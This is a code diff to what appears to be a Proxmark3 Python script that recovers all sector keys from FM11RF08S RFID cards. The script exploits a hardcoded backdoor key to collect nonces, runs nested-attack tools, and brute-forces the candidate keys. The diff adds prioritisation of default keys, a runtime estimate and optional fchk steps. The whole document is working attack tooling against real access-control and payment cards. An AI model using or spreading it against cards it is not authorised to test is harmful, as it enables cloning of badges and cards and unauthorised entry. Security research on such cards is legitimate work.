@@ -18,6 +18,7 @@ import sys
 import time
 import subprocess
 import argparse
+import json
 import pm3
 # optional color support
 try:
@@ -30,14 +31,20 @@ except ModuleNotFoundError:
 
 BACKDOOR_RF08S = "A396EFA4E24F"
 NUM_SECTORS = 16
+DICT_DEF = "mfc_default_keys.dic"
+DEFAULT_KEYS = set()
 if os.path.basename(os.path.dirname(os.path.dirname(sys.argv[0]))) == 'client':
     # dev setup
     TOOLS_PATH = os.path.normpath(os.path.join(f"{os.path.dirname(sys.argv[0])}",
                                                "..", "..", "tools", "mfc", "card_only"))
+    DICT_DEF_PATH = os.path.normpath(os.path.join(f"{os.path.dirname(sys.argv[0])}",
+                                                  "..", "dictionaries", DICT_DEF))
 else:
     # assuming installed
     TOOLS_PATH = os.path.normpath(os.path.join(f"{os.path.dirname(sys.argv[0])}",
                                                "..", "tools"))
+    DICT_DEF_PATH = os.path.normpath(os.path.join(f"{os.path.dirname(sys.argv[0])}",
+                                                  "dictionaries", DICT_DEF))
 
 tools = {
     "staticnested_1nt": os.path.join(f"{TOOLS_PATH}", "staticnested_1nt"),
@@ -54,8 +61,8 @@ for tool, bin in tools.items():
 
 parser = argparse.ArgumentParser(description='A script combining staticnested* tools '
                                  'to recover all keys from a FM11RF08S card.')
-parser.add_argument('-x', '--no-init-check', action='store_true', help='Do not run an initial fchk for default keys')
-parser.add_argument('-y', '--no-final-check', action='store_true', help='Do not run a final fchk with the found keys')
+parser.add_argument('-x', '--init-check', action='store_true', help='Run an initial fchk for default keys')
+parser.add_argument('-y', '--final-check', action='store_true', help='Run a final fchk with the found keys')
 parser.add_argument('-d', '--debug', action='store_true', help='Enable debug mode')
 args = parser.parse_args()
 
@@ -66,7 +73,6 @@ p.console("hf 14a read")
 uid = None
 
 for line in p.grabbed_output.split('\n'):
-    print(line)
     if "UID:" in line:
         uid = int(line[10:].replace(' ', '')[-8:], 16)
 
@@ -82,7 +88,7 @@ def print_key(sec, key_type, key):
 
 
 found_keys = [["", ""] for _ in range(NUM_SECTORS)]
-if not args.no_init_check:
+if args.init_check:
     print("Checking default keys...")
     p.console("hf mf fchk")
     for line in p.grabbed_output.split('\n'):
@@ -96,41 +102,23 @@ if not args.no_init_check:
                 found_keys[sec][1] = res[4]
                 print_key(sec, 1, found_keys[sec][1])
 
-nt = [["", ""] for _ in range(NUM_SECTORS)]
-nt_enc = [["", ""] for _ in range(NUM_SECTORS)]
-par_err = [["", ""] for _ in range(NUM_SECTORS)]
 print("Getting nonces...")
-for sec in range(NUM_SECTORS):
-    blk = sec * 4
-    if found_keys[sec][0] == "" or found_keys[sec][1] == "":
-        # Even if one key already found, we'll need both nt
-        for key_type in [0, 1]:
-            cmd = f"hf mf isen -n1 --blk {blk} -c {key_type+4} --key {BACKDOOR_RF08S}"
-            p.console(cmd)
-            cmd += f" --c2 {key_type}"
-            p.console(cmd)
-print("Processing traces...")
-for line in p.grabbed_output.split('\n'):
-    if "nested cmd: 64" in line or "nested cmd: 65" in line:
-        sec = int(line[24:26], 16)//4
-        key_type = int(line[21:23], 16) - 0x64
-        data = line[65:73]
-        nt[sec][key_type] = data
-    if "nested cmd: 60" in line or "nested cmd: 61" in line:
-        sec = int(line[24:26], 16)//4
-        key_type = int(line[21:23], 16) - 0x60
-        data = line[108:116]
-        nt_enc[sec][key_type] = data
-        data = line[128:136]
-        par_err[sec][key_type] = data
-for sec in range(NUM_SECTORS):
-    if found_keys[sec][0] == "" or found_keys[sec][1] == "":
-        for key_type in [0, 1]:
-            if (nt[sec][key_type] == "" or
-               nt_enc[sec][key_type] == "" or
-               par_err[sec][key_type] == ""):
-                print("Error, could not collect nonces, abort")
-                exit()
+cmd = f"hf mf isen --collect_fm11rf08s --key {BACKDOOR_RF08S}"
+p.console(cmd)
+try:
+    nt, nt_enc, par_err = json.loads(p.grabbed_output)
+except json.decoder.JSONDecodeError:
+    print("Error getting nonces, abort.")
+    exit()
+
+if os.path.isfile(DICT_DEF_PATH):
+    print(f"Loading {DICT_DEF}")
+    with open(DICT_DEF_PATH, 'r') as file:
+        for line in file:
+            if line[0] != '#' and len(line) >= 12:
+                DEFAULT_KEYS.add(line[:12])
+else:
+    print(f"Warning, {DICT_DEF} not found.")
 
 print("Running staticnested_1nt & 2x1nt when doable...")
 keys = [[set(), set()] for _ in range(NUM_SECTORS)]
@@ -138,6 +126,7 @@ all_keys = set()
 duplicates = set()
 # Availability of filtered dicts
 filtered_dicts = [[False, False] for _ in range(NUM_SECTORS)]
+found_default = [[False, False] for _ in range(NUM_SECTORS)]
 for sec in range(NUM_SECTORS):
     if found_keys[sec][0] != "" and found_keys[sec][1] != "":
         continue
@@ -155,14 +144,23 @@ for sec in range(NUM_SECTORS):
         subprocess.run(cmd, capture_output=True)
         filtered_dicts[sec][key_type] = True
         for key_type in [0, 1]:
+            keys_set = set()
             with (open(f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type]}_filtered.dic")) as f:
-                keys_set = set()
                 while line := f.readline().rstrip():
-                    if line not in keys_set:
-                        keys_set.add(line)
+                    keys_set.add(line)
                 keys[sec][key_type] = keys_set
                 duplicates.update(all_keys.intersection(keys_set))
                 all_keys.update(keys_set)
+            # Prioritize default keys
+            keys_def_set = DEFAULT_KEYS.intersection(keys_set)
+            keys_set.difference_update(DEFAULT_KEYS)
+            if len(keys_def_set) > 0:
+                found_default[sec][key_type] = True
+                with (open(f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type]}_filtered.dic", "w")) as f:
+                    for k in keys_def_set:
+                        f.write(f"{k}\n")
+                    for k in keys_set:
+                        f.write(f"{k}\n")
     else:  # one key not found or both identical
         if found_keys[sec][0] == "":
             key_type = 0
@@ -173,14 +171,23 @@ for sec in range(NUM_SECTORS):
         if args.debug:
             print(' '.join(cmd))
         subprocess.run(cmd, capture_output=True)
+        keys_set = set()
         with (open(f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type]}.dic")) as f:
-            keys_set = set()
             while line := f.readline().rstrip():
-                if line not in keys_set:
-                    keys_set.add(line)
+                keys_set.add(line)
             keys[sec][key_type] = keys_set
             duplicates.update(all_keys.intersection(keys_set))
             all_keys.update(keys_set)
+        # Prioritize default keys
+        keys_def_set = DEFAULT_KEYS.intersection(keys_set)
+        keys_set.difference_update(DEFAULT_KEYS)
+        if len(keys_def_set) > 0:
+            found_default[sec][key_type] = True
+            with (open(f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type]}.dic", "w")) as f:
+                for k in keys_def_set:
+                    f.write(f"{k}\n")
+                for k in keys_set:
+                    f.write(f"{k}\n")
 
 print("Looking for common keys across sectors...")
 keys_filtered = [[set(), set()] for _ in range(NUM_SECTORS)]
@@ -206,6 +213,66 @@ for sec in range(NUM_SECTORS):
                 for k in keys_filtered[sec][key_type]:
                     f.write(f"{k}\n")
             duplicates_dicts[sec][key_type] = True
+
+print("Computing needed time for attack...")
+candidates = [[0, 0] for _ in range(NUM_SECTORS)]
+for sec in range(NUM_SECTORS):
+    for key_type in [0, 1]:
+        if found_keys[sec][0] == "" and found_keys[sec][1] == "" and duplicates_dicts[sec][key_type]:
+            kt = ['a', 'b'][key_type]
+            dic = f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type]}_duplicates.dic"
+            with open(dic, 'r') as file:
+                count = sum(1 for _ in file)
+#            print(f"dic {dic} size {count}")
+            candidates[sec][key_type] = count
+            if nt[sec][0] == nt[sec][1]:
+                candidates[sec][key_type ^ 1] = 1
+    for key_type in [0, 1]:
+        if found_keys[sec][0] == "" and found_keys[sec][1] == "" and filtered_dicts[sec][key_type] and candidates[sec][0] == 0 and candidates[sec][1] == 0:
+            if found_default[sec][key_type]:
+                # We assume the default key is correct
+                candidates[sec][key_type] = 1
+            else:
+                kt = ['a', 'b'][key_type]
+                dic = f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type]}_filtered.dic"
+                with open(dic, 'r') as file:
+                    count = sum(1 for _ in file)
+#                print(f"dic {dic} size {count}")
+                candidates[sec][key_type] = count
+    if found_keys[sec][0] == "" and found_keys[sec][1] == "" and nt[sec][0] == nt[sec][1] and candidates[sec][0] == 0 and candidates[sec][1] == 0:
+        if found_default[sec][0]:
+            # We assume the default key is correct
+            candidates[sec][0] = 1
+            candidates[sec][1] = 1
+        else:
+            key_type = 0
+            kt = ['a', 'b'][key_type]
+            dic = f"keys_{uid:08x}_{sec:02}_{nt[sec][key_type]}.dic"
+            with open(dic, 'r') as file:
+                count = sum(1 for _ in file)
+#            print(f"dic {dic} size {count}")
+            candidates[sec][0] = count
+            candidates[sec][1] = 1
+
+if args.debug:
+    for sec in range(NUM_SECTORS):
+        print(f" {sec:03} | {sec*4+3:03} | {candidates[sec][0]:6} | {candidates[sec][1]:6}  ")
+total_candidates = sum(candidates[sec][0] + candidates[sec][1] for sec in range(NUM_SECTORS))
+
+elapsed_time = time.time() - start_time
+minutes1 = int(elapsed_time // 60)
+seconds1 = int(elapsed_time % 60)
+print("----Step 1: " + color(f"{minutes1:2}", fg="yellow") + " minutes " +
+      color(f"{seconds1:2}", fg="yellow") + " seconds -----------")
+
+# fchk: 147 keys/s. Correct key found after 50% of candidates on average
+FCHK_KEYS_S = 147
+foreseen_time = (total_candidates / 2 / FCHK_KEYS_S) + 5
+minutes = int(foreseen_time // 60)
+seconds = int(foreseen_time % 60)
+print("Still about " + color(f"{minutes:2}", fg="yellow") + " minutes " +
+      color(f"{seconds:2}", fg="yellow") + " seconds to run...")
+start_time = time.time()
 
 abort = False
 print("Brute-forcing keys... Press any key to interrupt")
@@ -299,7 +366,6 @@ for sec in range(NUM_SECTORS):
         result = subprocess.run(cmd, capture_output=True, text=True).stdout
         keys = set()
         for line in result.split('\n'):
-            # print(line)
             if "MATCH:" in line:
                 keys.add(line[12:])
         if len(keys) > 1:
@@ -324,9 +390,19 @@ for sec in range(NUM_SECTORS):
 
 if abort:
     print("Brute-forcing phase aborted via keyboard!")
-    args.no_final_check = True
+    args.final_check = False
 
-if args.no_final_check:
+if args.final_check:
+    print("Letting fchk do a final dump, just for confirmation and display...")
+    keys_set = set([i for sl in found_keys for i in sl if i != ""])
+    with (open(f"keys_{uid:08x}.dic", "w")) as f:
+        for k in keys_set:
+            f.write(f"{k}\n")
+    cmd = f"hf mf fchk -f keys_{uid:08x}.dic --no-default --dump"
+    if args.debug:
+        print(cmd)
+    p.console(cmd, passthru = True)
+else:
     plus = "[" + color("+", fg="green") + "] "
     print()
     print(plus + color("found keys:", fg="green"))
@@ -361,19 +437,11 @@ if args.no_final_check:
     if unknown:
         print("[" + color("=", fg="yellow") + "]  --[ " + color("FFFFFFFFFFFF", fg="yellow") +
               " ]-- has been inserted for unknown keys")
-else:
-    print("Letting fchk do a final dump, just for confirmation and display...")
-    keys_set = set([i for sl in found_keys for i in sl if i != ""])
-    with (open(f"keys_{uid:08x}.dic", "w")) as f:
-        for k in keys_set:
-            f.write(f"{k}\n")
-    cmd = f"hf mf fchk -f keys_{uid:08x}.dic --no-default --dump"
-    if args.debug:
-        print(cmd)
-    p.console(cmd, passthru = True)
 
 elapsed_time = time.time() - start_time
-minutes = int(elapsed_time // 60)
-seconds = int(elapsed_time % 60)
-print("--- " + color(minutes, fg="yellow") + " minutes " +
-      color(seconds, fg="yellow") + " seconds ---")
+minutes2 = int(elapsed_time // 60)
+seconds2 = int(elapsed_time % 60)
+print("----Step 2: " + color(f"{minutes2:2}", fg="yellow") + " minutes " +
+      color(f"{seconds2:2}", fg="yellow") + " seconds -----------")
+print("---- TOTAL: " + color(f"{minutes1+minutes2:2}", fg="yellow") + " minutes " +
+      color(f"{seconds1+seconds2:2}", fg="yellow") + " seconds -----------")
